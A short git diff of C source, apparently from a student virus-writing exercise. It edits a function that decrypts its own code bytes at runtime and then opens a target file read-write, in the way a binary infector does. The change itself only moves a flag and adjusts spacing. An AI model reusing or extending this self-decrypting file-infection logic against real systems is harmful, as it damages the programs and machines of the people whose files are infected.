@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/31 19:28:21 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/02 17:40:50 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/03 17:58:14 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,17 +16,20 @@ void	inspect(t_data *data, char *path)
 {
 	revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
 
+
 #ifdef DEBUG
 	char de[] = "inspect\t \n";
 	data->context == true ?	de[8] = 49 : 48;
 	_write(1, de, _strlen(de));
 #endif
 
+
 	if (data->context != true)
 		goto ERR;
 
 	struct stat st;
 
+	data->context = false;
   	if ((data->bin.fd = _open(path, O_RDWR, 0000)) < 0)
 		goto ERR;
 	if (_fstat(data->bin.fd, &st) < 0)
